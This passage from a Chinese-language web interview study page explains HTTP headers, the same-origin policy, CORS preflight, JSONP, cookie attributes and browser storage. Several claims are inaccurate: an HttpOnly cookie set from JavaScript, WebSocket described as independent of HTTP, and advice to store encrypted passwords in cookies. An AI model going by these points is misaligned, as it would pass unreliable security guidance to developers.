<li>WebSocket 使用独立的协议，不依赖于HTTP，因此它可以在HTTP和HTTPS之外的端口上运行。</li>
<li>WebSocket 适用于需要实时双向通信的应用，如在线聊天、在线游戏、协作工具等。</li>
<li>WebSocket 可以传输文本和二进制数据，非常灵活。</li>
</ul>
</li>
</ol>
<p>综上所述，HTTP&#x2F;2.0服务器推送主要用于提前推送与当前请求相关的资源以加速页面加载，是一种单向通信；SSE 用于服务器向客户端的单向实时通信，而 WebSocket 允许建立双向通信通道，适用于更广泛的实时通信需求。选择哪种技术取决于具体的应用场景和需求。</p>
<h3 id="9、http的标头"><a href="#9、http的标头" class="headerlink" title="9、http的标头"></a>9、http的标头</h3><p>HTTP（Hypertext Transfer Protocol）标头是包含在HTTP请求和响应中的元数据信息，用于描述请求或响应的各个方面。HTTP标头提供了有关数据的重要信息，例如内容类型、日期、服务器信息、身份验证等等。以下是常见的HTTP标头：</p>
<p><strong>HTTP请求标头：</strong></p>
<ol>
<li><p><strong>Host：</strong> 指定目标服务器的主机名和端口号。必须包含在HTTP&#x2F;1.1请求中。</p>
</li>
<li><p><strong>User-Agent：</strong> 发起请求的用户代理（浏览器、爬虫、应用程序等）的标识信息。</p>
</li>
<li><p><strong>Accept：</strong> 指定客户端可接受的响应内容类型，通常是MIME类型。</p>
</li>
<li><p><strong>Content-Type：</strong> 指定请求主体的媒体类型，用于POST请求等。</p>
</li>
<li><p><strong>Authorization：</strong> 包含用于身份验证的凭据信息，例如基本身份验证或令牌。</p>
</li>
<li><p><strong>Cookie：</strong> 包含客户端与服务器之间的会话信息，用于跟踪用户状态。</p>
</li>
<li><p><strong>Referer（Referer）：</strong> 指示引用当前请求的URL，通常用于追踪链接来源。</p>
</li>
<li><p><strong>If-Modified-Since：</strong> 指定资源的最后修改日期，用于条件性GET请求，如果未修改则返回304状态码。</p>
</li>
<li><p><strong>Cache-Control：</strong> 控制缓存行为，例如max-age、no-cache、private等。</p>
</li>
</ol>
<p><strong>HTTP响应标头：</strong></p>
<ol>
<li><p><strong>Status Code：</strong> 表示响应的状态码，例如200 OK、404 Not Found、500 Internal Server Error等。</p>
</li>
<li><p><strong>Content-Type：</strong> 指定响应主体的媒体类型，用于告知客户端如何解释响应数据。</p>
</li>
<li><p><strong>Content-Length：</strong> 指示响应主体的字节数。</p>
</li>
<li><p><strong>Server：</strong> 表示服务器的信息，通常包含服务器名称和版本号。</p>
</li>
<li><p><strong>Set-Cookie：</strong> 用于在客户端中设置新的或更新现有的Cookie。</p>
</li>
<li><p><strong>Location：</strong> 用于重定向响应，指示客户端应该访问的新URL。</p>
</li>
<li><p><strong>WWW-Authenticate：</strong> 用于要求客户端提供身份验证凭据。</p>
</li>
<li><p><strong>Last-Modified：</strong> 指示资源的最后修改日期和时间，用于缓存控制。</p>
</li>
<li><p><strong>ETag：</strong> 用于标识资源的版本，用于条件性请求。</p>
</li>
</ol>
<p>这只是HTTP标头的一小部分，HTTP协议支持许多其他标头，每个标头都用于不同的目的。标头在HTTP通信中起着关键作用，帮助客户端和服务器协调请求和响应的处理。标头的正确使用可以提高性能、安全性和功能性，因此在编写Web应用程序或API时，理解和使用HTTP标头是非常重要的。</p>
<h2 id="浏览器特性篇"><a href="#浏览器特性篇" class="headerlink" title="浏览器特性篇"></a>浏览器特性篇</h2><h3 id="x3D-x3D-1、浏览器的同源策略-x3D-x3D"><a href="#x3D-x3D-1、浏览器的同源策略-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;1、浏览器的同源策略&#x3D;&#x3D;"></a>&#x3D;&#x3D;1、浏览器的同源策略&#x3D;&#x3D;</h3><p>跨域（Cross-Origin）是指在浏览器中，一个网页的运行环境（origin）试图去请求另一个网页的资源，但这两个网页的”origin”（协议、域名、端口）不相同。跨域是由浏览器的同源策略（Same-Origin Policy）所引发的安全限制，目的是保护用户的隐私和安全，防止恶意网站访问用户的敏感数据。</p>
<p>以下是一些跨域情况的示例：</p>
<ol>
<li><p><strong>不同域名</strong>：例如，一个网页试图从<code>https://example.com</code>请求资源，但资源在<code>https://api.example2.com</code>上。</p>
</li>
<li><p><strong>不同子域</strong>：即使是不同子域也被视为不同的域。例如，<code>https://subdomain1.example.com</code>尝试请求<code>https://subdomain2.example.com</code>上的资源。</p>
</li>
<li><p><strong>不同协议</strong>：使用不同的协议也会被认为是跨域。例如，<code>http://example.com</code>请求<code>https://example.com</code>上的资源。</p>
</li>
<li><p><strong>不同端口</strong>：不同端口也会导致跨域问题。例如，<code>https://example.com:8080</code>请求<code>https://example.com:3000</code>上的资源。</p>
</li>
</ol>
<p>跨域问题会导致浏览器阻止跨域请求，除非目标服务器明确允许跨域请求。有几种方法可以解决跨域问题：</p>
<ol>
<li><p><strong>CORS（跨源资源共享）</strong>：通过在服务器响应中设置CORS头，服务器可以明确允许来自不同源的请求。这是最常用的跨域解决方案。例如，服务器可以设置<code>Access-Control-Allow-Origin</code>头以指定哪些源可以访问资源。</p>
</li>
<li><p><strong>JSONP（JSON with Padding）</strong>：JSONP是一种通过动态创建<code>&lt;script&gt;</code>标签来加载JSON数据的方法。由于<code>&lt;script&gt;</code>标签不受同源策略限制，因此它可以用于跨域请求。</p>
</li>
<li><p><strong>代理服务器</strong>：在同一域中设置一个代理服务器，然后在代理服务器上发起请求，再将响应传递给浏览器。这样可以绕过同源策略，但需要额外的服务器资源。</p>
</li>
<li><p><strong>使用跨域资源共享代理（CORS Proxy）</strong>：一些服务提供了CORS代理，可以通过这些代理来访问跨域资源，然后代理服务器会将资源返回给你的网页。</p>
</li>
<li><p><strong>WebSocket</strong>：WebSocket协议不受同源策略限制，可以用于在不同源之间建立双向通信。</p>
</li>
</ol>
<p>同源策略的限制表现在以下方面：</p>
<ul>
<li><p><strong>XHR请求限制：</strong> 使用XMLHttpRequest或Fetch API发送的跨源HTTP请求通常会受到同源策略的限制，需要服务器支持CORS（跨源资源共享）来放宽这些限制。</p>
</li>
<li><p><strong>Cookie和LocalStorage限制：</strong> Cookie、LocalStorage和SessionStorage等客户端存储数据的机制受到同源策略的限制。一个页面只能访问自己域名下的Cookie和存储数据。</p>
</li>
<li><p><strong>DOM限制：</strong> JavaScript代码只能访问与其来源相同的文档对象模型（DOM）元素。这意味着无法通过脚本直接访问来自其他源的页面的DOM元素。</p>
</li>
</ul>
<p>为了实现跨域资源共享，服务器可以通过设置响应头来允许来自其他域的请求，从而绕过同源策略的限制。例如，通过设置<code>Access-Control-Allow-Origin</code>头，服务器可以明确指定哪些域名可以访问其资源。</p>
<p>尽管同源策略对安全性非常重要，但它在某些情况下也会带来不便。因此，开发人员需要了解如何处理跨域请求，并在需要时使用CORS或JSONP等技术来安全地实现跨域通信。</p>
<h5 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h5><p>CORS（跨源资源共享，Cross-Origin Resource Sharing）是一种浏览器安全策略，用于控制在不同源（origin）之间的 web 页面是否允许进行跨域请求。同源策略是浏览器的一项重要安全特性，它限制了来自不同源的网页对当前网页的访问，以保护用户的隐私和安全。CORS 为了解决这个限制而被引入。</p>
<p>以下是关于 CORS 的重要概念和原则：</p>
<ol>
<li><p><strong>同源策略（Same-Origin Policy）：</strong> 同源策略是浏览器的一项安全特性，它要求浏览器限制不同源（协议、域名、端口）的网页间的 JavaScript 交互，以防止潜在的安全风险。</p>
</li>
<li><p><strong>跨域请求：</strong> 当一个网页从一个域（origin）请求另一个域的资源时，就会发生跨域请求。例如，一个网页在域名 <code>example.com</code> 上运行的 JavaScript 代码请求了 <code>api.exampleapi.com</code> 上的数据。</p>
</li>
<li><p><strong>同源请求和跨源请求的区别：</strong> 同源请求是从相同的源发出的请求，而跨源请求是从不同源发出的请求。</p>
</li>
<li><p><strong>CORS 头部：</strong> 服务器可以通过设置 CORS 头部来指示浏览器是否允许跨源请求。常见的 CORS 头部包括 <code>Access-Control-Allow-Origin</code>（允许哪些源访问资源）、<code>Access-Control-Allow-Methods</code>（允许的 HTTP 方法）、<code>Access-Control-Allow-Headers</code>（允许的请求头）、<code>Access-Control-Allow-Credentials</code>（是否允许携带凭证）等。</p>
</li>
<li><p><strong>简单请求和预检请求：</strong> 浏览器将跨源请求分为简单请求和非简单请求。简单请求满足一定条件，可以直接发送请求，而非简单请求需要进行预检请求（Preflight Request）以获取服务器的许可。</p>
</li>
<li><p><strong>凭证（Credentials）：</strong> 当设置了 <code>Access-Control-Allow-Credentials</code> 头部为 <code>true</code> 时，浏览器会允许跨源请求携带凭证（如 cookies 和 HTTP 认证信息）。</p>
</li>
</ol>
<p>CORS 为开发者提供了一种机制，可以在遵循同源策略的同时，实现跨域数据访问。开发者需要在服务器端配置 CORS 头部以允许或拒绝特定来源的请求。在前端，可以使用 XMLHttpRequest 或 Fetch API 发送跨源请求，并通过浏览器的同源策略和 CORS 头部来控制请求的许可。这有助于实现跨域的数据交互，例如从不同的域获取数据或调用 API。</p>
<h5 id="简单请求，预检请求"><a href="#简单请求，预检请求" class="headerlink" title="简单请求，预检请求"></a>简单请求，预检请求</h5><p>在跨域请求（Cross-Origin Request）中，浏览器会根据请求的类型和头信息将请求分为两种主要类型：简单请求（Simple Request）和预检请求（Preflight Request）。这两种请求类型涉及到跨域资源共享（CORS）机制，用于在浏览器中控制跨域请求的安全性。</p>
<ol>
<li><p><strong>简单请求（Simple Request）：</strong></p>
<p>简单请求是指满足一定条件的跨域请求，它必须同时满足以下条件：</p>
<ul>
<li>使用以下 HTTP 方法之一：GET、HEAD、POST。</li>
<li>请求头信息限定为以下几种：Accept、Accept-Language、Content-Language、Last-Event-ID、Content-Type（仅限于三个值：application&#x2F;x-www-form-urlencoded、multipart&#x2F;form-data、text&#x2F;plain）。</li>
<li>请求中不包含任何自定义的头信息。</li>
</ul>
<p>简单请求不会触发预检请求，浏览器会直接发送请求到目标服务器，服务器可以进行响应，响应中需要包含正确的 CORS 头信息（例如 <code>Access-Control-Allow-Origin</code>）以允许跨域请求。</p>
</li>
<li><p><strong>预检请求（Preflight Request）：</strong></p>
<p>预检请求是指不符合简单请求条件的跨域请求。如果请求不符合简单请求的条件，浏览器会先发送一个预检请求 OPTIONS（HTTP 方法） 请求到目标服务器，以获取服务器是否支持跨域请求。预检请求包含以下信息：</p>
<ul>
<li>HTTP 方法为 OPTIONS。</li>
<li>在请求头中包含了以下信息：<ul>
<li>Origin：表示请求的源（域名）。</li>
<li>Access-Control-Request-Method：表示实际请求将使用的 HTTP 方法。</li>
<li>Access-Control-Request-Headers：表示实际请求将使用的自定义头信息。</li>
</ul>
</li>
</ul>
<p>目标服务器收到预检请求后，会检查是否支持该跨域请求。如果支持，服务器会返回带有 CORS 头信息的响应，表明可以进行跨域请求。浏览器接收到服务器的响应后，才会发送实际的跨域请求。</p>
</li>
</ol>
<p>总结：</p>
<ul>
<li>简单请求满足一定条件，可以直接发起跨域请求，不需要预检请求。</li>
<li>预检请求是为了检查服务器是否支持跨域请求，只有在服务器返回允许跨域的响应后，浏览器才会发送实际请求。</li>
<li>CORS 头信息（例如 <code>Access-Control-Allow-Origin</code>）在响应中扮演了重要的角色，用于控制跨域请求的安全性。</li>
</ul>
<h5 id="CORS有时候会发一个option请求，有了解过吗？"><a href="#CORS有时候会发一个option请求，有了解过吗？" class="headerlink" title="CORS有时候会发一个option请求，有了解过吗？"></a>CORS有时候会发一个option请求，有了解过吗？</h5><p>是的，CORS（跨源资源共享）机制在某些情况下会发送一个OPTIONS请求，这个请求通常被称为”预检请求”（Preflight Request）。预检请求的目的是允许浏览器在实际发起跨域请求之前，向目标服务器发送一个OPTIONS请求，以获取关于服务器是否支持跨域请求的信息，以及请求所使用的 HTTP 方法是否被允许。</p>
<p>以下是一些常见情况下浏览器会发送预检请求的情况：</p>
<ol>
<li><p><strong>跨域AJAX请求：</strong> 当使用XMLHttpRequest或Fetch API等方式发起跨域AJAX请求时，浏览器会先发送一个OPTIONS请求，检查服务器是否支持跨域请求。</p>
</li>
<li><p><strong>带有自定义头信息的请求：</strong> 如果请求中包含自定义的HTTP头信息（如<code>Authorization</code>头用于身份验证），浏览器也会发送预检请求。</p>
</li>
<li><p><strong>使用非简单HTTP方法：</strong> 如果请求使用的HTTP方法不是简单请求（例如GET、POST、HEAD），而是诸如PUT、DELETE、OPTIONS等复杂请求方法，浏览器也会发送预检请求。</p>
</li>
</ol>
<p>预检请求的响应中包含了CORS相关的头信息，如<code>Access-Control-Allow-Origin</code>、<code>Access-Control-Allow-Methods</code>、<code>Access-Control-Allow-Headers</code>等，这些头信息告诉浏览器是否允许实际的跨域请求以及使用哪些方法和头信息。只有在预检请求的响应中包含了合适的CORS头信息，并且服务器确认支持跨域请求，浏览器才会继续发送实际的跨域请求。</p>
<p>以下是一个典型的预检请求的示例：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">OPTIONS</span> <span class="hljs-string">/api/resource</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>example.com<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://example.org<br><span class="hljs-attribute">Access-Control-Request-Method</span><span class="hljs-punctuation">: </span>POST<br><span class="hljs-attribute">Access-Control-Request-Headers</span><span class="hljs-punctuation">: </span>X-Custom-Header<br></code></pre></td></tr></table></figure>

<p>服务器接收到预检请求后，需要返回一个包含CORS头信息的响应，例如：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Access-Control-Allow-Origin</span><span class="hljs-punctuation">: </span>http://example.org<br><span class="hljs-attribute">Access-Control-Allow-Methods</span><span class="hljs-punctuation">: </span>POST<br><span class="hljs-attribute">Access-Control-Allow-Headers</span><span class="hljs-punctuation">: </span>X-Custom-Header<br></code></pre></td></tr></table></figure>

<p>这样浏览器才会继续发送实际的跨域请求。预检请求的目的是增加安全性，确保服务器明确允许了跨域请求，从而减少潜在的安全风险。</p>
<h5 id="跨域检测过程"><a href="#跨域检测过程" class="headerlink" title="跨域检测过程"></a>跨域检测过程</h5><p>跨域检测（Cross-Origin Detection）是浏览器的一项安全特性，用于检测和限制跨源请求，以防止恶意网站访问其他源的敏感数据。跨域检测的主要过程包括以下几个步骤：</p>
<ol>
<li><p><strong>发起跨域请求：</strong> 当浏览器中的一个网页（源A）尝试向不同源的服务器（源B）发送HTTP请求时，浏览器会首先发起该请求。</p>
</li>
<li><p><strong>预检请求（对于CORS）：</strong> 如果请求是一种需要预检的跨域请求（例如带有自定义头部的请求或使用HTTP方法如PUT、DELETE等的请求），浏览器会首先发送一个OPTIONS请求，这个请求被称为”预检请求”（preflight request）。预检请求的目的是询问服务器是否允许实际请求的跨域访问。</p>
</li>
<li><p><strong>服务器响应（对于CORS）：</strong> 服务器接收到预检请求后，会检查请求头中的”Origin”字段，然后决定是否允许该跨域请求。如果服务器允许跨域访问，它会在响应中包含一些特定的CORS头部，如”Access-Control-Allow-Origin”，来告知浏览器该请求是被允许的。</p>
</li>
<li><p><strong>浏览器处理响应：</strong> 浏览器会检查服务器的响应，如果发现响应头中包含了必要的CORS头部并且源A被允许访问源B，浏览器将允许实际请求（例如GET、POST等）继续。如果服务器未返回必要的头部或者不允许跨域访问，浏览器会阻止实际请求，从而保护源B的数据。</p>
</li>
<li><p><strong>获取响应数据（对于实际请求）：</strong> 如果实际请求被允许，浏览器会向源B发送实际请求，并获取响应数据。这个过程是允许跨域请求的最终阶段。</p>
</li>
</ol>
<p>需要注意的是，跨域检测只是浏览器层面的限制，它不适用于服务器之间的通信。服务器之间的跨域请求是可能的，但需要在服务器端进行配置，以允许或拒绝跨域请求。</p>
<p>此外，对于不同的跨域请求方式（例如JSONP、CORS、代理等），跨域检测的过程会有所不同。CORS是目前最常用的跨域解决方案之一，它提供了更灵活的方式来控制跨域请求。</p>
<h5 id="为什么JSONP可以跨域"><a href="#为什么JSONP可以跨域" class="headerlink" title="为什么JSONP可以跨域"></a>为什么JSONP可以跨域</h5><p>JSONP（JSON with Padding）可以跨域的原因是因为它利用了浏览器对<code>&lt;script&gt;</code>标签的加载行为的一种特性，而不受同源策略的限制。以下是JSONP可以跨域的关键原因：</p>
<ol>
<li><p><strong>加载外部脚本不受同源策略限制：</strong> 浏览器允许通过<code>&lt;script&gt;</code>标签加载来自不同域的脚本文件。这是由于同源策略的一个例外规则，浏览器允许加载外部脚本，而不会阻止跨域请求。</p>
</li>
<li><p><strong>动态创建<code>&lt;script&gt;</code>标签：</strong> JSONP利用了动态创建<code>&lt;script&gt;</code>标签的方式来请求跨域数据。客户端（浏览器）通过创建一个<code>&lt;script&gt;</code>标签，并将目标服务器的URL作为<code>src</code>属性的值，从而发起跨域请求。浏览器会将这个标签加载为一个外部脚本，而不会对其进行同源策略检查。</p>
</li>
<li><p><strong>回调函数：</strong> JSONP要求客户端在请求中指定一个回调函数的名称，并将这个回调函数名称作为查询参数包含在URL中。目标服务器在响应中使用这个回调函数来包装数据，以便客户端可以在响应到达后执行该函数。这是JSONP的关键部分，通过回调函数，客户端可以获取并处理来自不同域的数据。</p>
</li>
</ol>
<p>需要注意的是，JSONP存在一些潜在的安全风险，因为它要求服务器信任客户端提供的回调函数名称，并且客户端需要谨慎处理从跨域服务器返回的数据，以防止安全漏洞。因此，在使用JSONP时，请确保只与受信任的服务器交互，并避免在URL中包含敏感信息。在现代Web开发中，推荐使用更安全和灵活的跨域解决方案，如CORS（跨域资源共享）或代理服务器。</p>
<h3 id="2、浏览器本地存储"><a href="#2、浏览器本地存储" class="headerlink" title="2、浏览器本地存储"></a>2、浏览器本地存储</h3><p>在 JavaScript 中，有几种本地存储的方式，每种方式都有其特点和用途，以下是常见的本地存储方式以及它们的区别：</p>
<ol>
<li><p><strong>Cookies（Cookie）：</strong></p>
<ul>
<li>Cookies 是最早的本地存储机制之一，可以通过 <code>document.cookie</code> 属性进行读写。</li>
<li>Cookies 的特点是可以存储小量数据（通常不超过 4KB），并且可以设置过期时间。</li>
<li>Cookies 在每个 HTTP 请求中都会被发送到服务器，可能会影响性能。</li>
</ul>
</li>
<li><p><strong>Web Storage（Web 存储）：</strong></p>
<ul>
<li>Web Storage 包括 <code>localStorage</code> 和 <code>sessionStorage</code> 两种机制。</li>
<li><code>localStorage</code>：用于长期存储数据，数据在不同页面和浏览器会话中保持不变。它可以存储大约 5MB 的数据。最大为10M字节空间。</li>
<li><code>sessionStorage</code>：用于会话级别的存储，数据在当前会话结束后会被清除。它也可以存储大约 5MB 的数据。</li>
<li>Web Storage 是键值对的存储方式，数据以字符串形式存储，不支持复杂数据类型。</li>
</ul>
</li>
<li><p><strong>IndexedDB：</strong></p>
<ul>
<li>IndexedDB 是一个更强大的本地数据库，用于存储大量结构化数据。它支持事务、索引、查询等高级功能。</li>
<li>IndexedDB 具有较高的容量限制，通常可以存储数百兆到几个GB的数据。</li>
<li>与 Web Storage 不同，IndexedDB 支持存储复杂的 JavaScript 对象，而不仅仅是字符串。</li>
</ul>
</li>
<li><p><strong>Cache API：</strong></p>
<ul>
<li>Cache API 用于存储缓存的响应数据，通常用于提高 Web 应用的性能。</li>
<li>Cache API 可以存储响应对象、图片、样式表等资源，允许开发者灵活地控制缓存的策略。</li>
<li>它通常与 Service Worker 结合使用，以实现离线访问和更高级的缓存管理。</li>
</ul>
</li>
<li><p><strong>File API：</strong></p>
<ul>
<li>File API 允许 Web 应用访问用户文件系统，以读写文件。虽然它通常不用于存储数据，但可以用于上传和下载文件。</li>
</ul>
</li>
</ol>
<p>区别总结：</p>
<ul>
<li>Cookies 适用于小数据存储，但会在每个 HTTP 请求中发送到服务器。</li>
<li>Web Storage 提供了简单的键值对存储，适用于较大量的数据。</li>
<li>IndexedDB 适用于大规模结构化数据存储，支持高级查询和事务。</li>
<li>Cache API 用于缓存响应数据以提高性能。</li>
<li>File API 用于处理用户文件系统中的文件。</li>
</ul>
<p>选择哪种本地存储方式取决于具体的需求和数据规模。对于简单的键值对存储，Web Storage 是一个不错的选择。如果需要高级数据库功能和大规模数据存储，可以考虑使用 IndexedDB。如果需要缓存网络请求或资源，可以使用 Cache API。</p>
<h5 id="Cookie能设置什么"><a href="#Cookie能设置什么" class="headerlink" title="Cookie能设置什么"></a>Cookie能设置什么</h5><p>Cookie 是一种在客户端（通常是浏览器）存储数据的小型文本文件。它可以用于在客户端和服务器之间传递和存储有关用户的信息。Cookie 可以包含多种信息，但需要注意的是，由于其大小和安全性限制，通常不适合存储大量敏感数据。</p>
<p>以下是可以在 Cookie 中设置的信息：</p>
<ol>
<li><p><strong>键值对数据：</strong> Cookie 最基本的用法是存储键值对数据，可以是任何文本数据。例如：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> = <span class="hljs-string">&quot;username=John&quot;</span>;<br><span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> = <span class="hljs-string">&quot;favoriteColor=blue&quot;</span>;<br></code></pre></td></tr></table></figure>

<p>上述代码创建了两个 Cookie，分别存储了用户名和喜欢的颜色。</p>
</li>
<li><p><strong>过期时间：</strong> 可以设置 Cookie 的过期时间，使其在指定时间后失效。过期时间可以是一个具体的日期和时间，也可以是相对于当前时间的秒数。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 设置 Cookie 在一小时后过期</span><br><span class="hljs-keyword">const</span> expirationDate = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>();<br>expirationDate.<span class="hljs-title function_">setHours</span>(expirationDate.<span class="hljs-title function_">getHours</span>() + <span class="hljs-number">1</span>);<br><span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> = <span class="hljs-string">`sessionToken=abc123; expires=<span class="hljs-subst">$&#123;expirationDate.toUTCString()&#125;</span>`</span>;<br><br><span class="hljs-comment">// 或者使用相对时间</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> = <span class="hljs-string">&quot;userId=123; max-age=3600&quot;</span>; <span class="hljs-comment">// 3600秒后过期</span><br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>路径和域名限制：</strong> 可以指定 Cookie 的可访问路径和域名，以控制哪些页面可以访问 Cookie。这有助于增强安全性和隐私。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 限制 Cookie 只能在当前路径下访问</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> = <span class="hljs-string">&quot;sessionId=abc; path=/secure&quot;</span>;<br><br><span class="hljs-comment">// 限制 Cookie 只能在指定域名下访问</span><br><span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> = <span class="hljs-string">&quot;authToken=xyz; domain=example.com&quot;</span>;<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>安全标志：</strong> 通过设置安全标志，可以确保 Cookie 只在安全的 HTTPS 连接下传输。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> = <span class="hljs-string">&quot;secureCookie=123; secure&quot;</span>;<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>HttpOnly标志：</strong> 通过设置 HttpOnly 标志，可以防止 JavaScript 代码访问 Cookie，从而增加安全性。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> = <span class="hljs-string">&quot;sessionToken=xyz; HttpOnly&quot;</span>;<br></code></pre></td></tr></table></figure></li>
</ol>
<p>需要注意的是，虽然 Cookie 是一种方便的客户端存储机制，但它们也有一些限制，包括大小限制、浏览器数量限制以及对隐私的一些风险。因此，在使用 Cookie 存储敏感信息时，务必谨慎，并考虑其他安全性更高的存储选项，如使用浏览器的 Web Storage API 或将敏感数据存储在服务器端。</p>
<h5 id="cookie一般存什么"><a href="#cookie一般存什么" class="headerlink" title="cookie一般存什么"></a>cookie一般存什么</h5><p>Cookie 是一种在客户端（浏览器）和服务器之间传递的小型文本文件，它可以存储在用户的计算机上。Cookie 主要有以下作用：</p>
<ol>
<li><p><strong>跟踪用户会话：</strong> Cookie 可以用于跟踪用户的会话状态，以识别用户并在不同页面之间保持一致的状态。例如，用户登录后，服务器可以创建一个包含用户标识的 Cookie，以便在用户访问其他页面时识别该用户。</p>
</li>
<li><p><strong>存储用户偏好设置：</strong> 通过 Cookie，网站可以存储用户的偏好设置，如语言选择、主题、字体大小等，以提供个性化的用户体验。</p>
</li>
<li><p><strong>购物车和电子商务：</strong> 在电子商务网站中，Cookie 可以用于存储用户的购物车内容，使用户可以在多个页面之间保持购物车状态。</p>
</li>
<li><p><strong>记住登录状态：</strong> Cookie 常用于记住用户的登录状态，以便用户在下次访问时自动登录。</p>
</li>
<li><p><strong>广告和跟踪分析：</strong> Cookie 可以用于广告跟踪和分析用户行为，以便向用户显示相关广告和收集网站使用数据。</p>
</li>
<li><p><strong>防止 CSRF 攻击：</strong> 在某些情况下，Cookie 可以用于增强网站的安全性，防止跨站请求伪造（CSRF）攻击。</p>
</li>
<li><p><strong>存储临时数据：</strong> Cookie 还可以用于存储一些临时数据，如临时会话标识或页面浏览历史。</p>
</li>
</ol>
<p>一般来说，Cookie 存储的信息应该是敏感度较低的数据，因为 Cookie 存储在用户的计算机上，用户有能力查看和修改 Cookie。对于敏感信息（如密码或信用卡号），通常不应该存储在 Cookie 中，而应该使用其他更安全的方式，如使用服务器端会话来管理用户状态。</p>
<p>总之，Cookie 是一种有用的工具，用于在客户端和服务器之间传递信息和维护状态，但在使用时需要谨慎处理敏感数据和用户隐私。</p>
<h5 id="cookie存密码怎么保证安全"><a href="#cookie存密码怎么保证安全" class="headerlink" title="cookie存密码怎么保证安全"></a>cookie存密码怎么保证安全</h5><p>将密码存储在 Cookie 中是不安全的做法，因为 Cookie 存储在用户的计算机上，用户有能力查看和修改 Cookie 数据。如果密码泄漏或被盗，将会对用户的安全造成严重威胁。因此，密码存储应该采用更加安全的方式。以下是一些提高密码存储安全性的方法：</p>
<ol>
<li><p><strong>不要明文存储密码：</strong> 绝不要将用户密码明文存储在 Cookie 中或任何客户端存储中。明文密码的泄漏会对用户的安全构成直接威胁。</p>
</li>
<li><p><strong>使用加密存储：</strong> 应该对密码进行适当的加密，然后将加密后的密码存储在 Cookie 中。加密算法应该是安全的且不容易破解的。</p>
</li>
<li><p><strong>使用会话令牌：</strong> 可以考虑使用会话令牌（Session Token）而不是密码存储在 Cookie 中。用户登录成功后，分配一个唯一的会话令牌，并将该令牌存储在 Cookie 中。服务器使用令牌来验证用户身份，而不是存储密码。</p>
</li>
<li><p><strong>设置安全标志：</strong> 使用 Cookie 属性中的 <code>HttpOnly</code> 和 <code>Secure</code> 标志来提高安全性。<code>HttpOnly</code> 标志可以防止 JavaScript 访问 Cookie，从而防止可能的 XSS 攻击。<code>Secure</code> 标志要求 Cookie 只在加密的 HTTPS 连接中传输。</p>
</li>
<li><p><strong>使用单点登录（Single Sign-On，SSO）：</strong> 对于多个相关应用的情况，可以考虑使用单点登录系统，用户只需要在一次登录后获得令牌，然后可以在多个应用之间共享登录状态，而无需存储密码在 Cookie 中。</p>
</li>
<li><p><strong>定期更改密码：</strong> 如果确实需要将密码存储在 Cookie 中，应该定期要求用户更改密码，并更新 Cookie 中的密码。</p>
</li>
<li><p><strong>限制 Cookie 的生命周期：</strong> 将存储密码的 Cookie 设置为短期有效，以减小泄漏的风险。</p>
</li>
</ol>
<p>总之，密码存储是一个敏感的问题，应该采取一系列安全措施来降低风险。最佳的做法是避免将密码存储在客户端，而是在服务器端进行身份验证和密码管理。对于客户端存储，应该采用会话令牌或其他替代方案来提高安全性。</p>
<h3 id="3、浏览器如何渲染数据"><a href="#3、浏览器如何渲染数据" class="headerlink" title="3、浏览器如何渲染数据"></a>3、浏览器如何渲染数据</h3><p>浏览器渲染数据的过程是一个复杂的流程，涉及多个步骤和组件。以下是浏览器渲染数据的主要步骤：</p>
<ol>
<li><p><strong>解析 HTML 和构建 DOM 树：</strong> 浏览器首先将接收到的 HTML 文档解析为 DOM（文档对象模型）树。DOM 树是一个表示页面结构和内容的树状结构，每个 HTML 元素都对应一个 DOM 节点。</p>
</li>
<li><p><strong>解析 CSS 和构建 CSSOM 树：</strong> 浏览器解析样式表（通常是外部 CSS 文件和内嵌样式）并构建 CSSOM（CSS 对象模型）树。CSSOM 树表示了页面的样式信息，包括每个元素的样式规则和计算后的样式值。</p>
</li>
<li><p><strong>合并 DOM 和 CSSOM，构建渲染树（Render Tree）：</strong> 浏览器将 DOM 树和 CSSOM 树合并，构建出渲染树。渲染树包含了需要渲染的可见元素，但不包括对页面布局无影响的元素，如 <code>display: none</code> 的元素。</p>
</li>
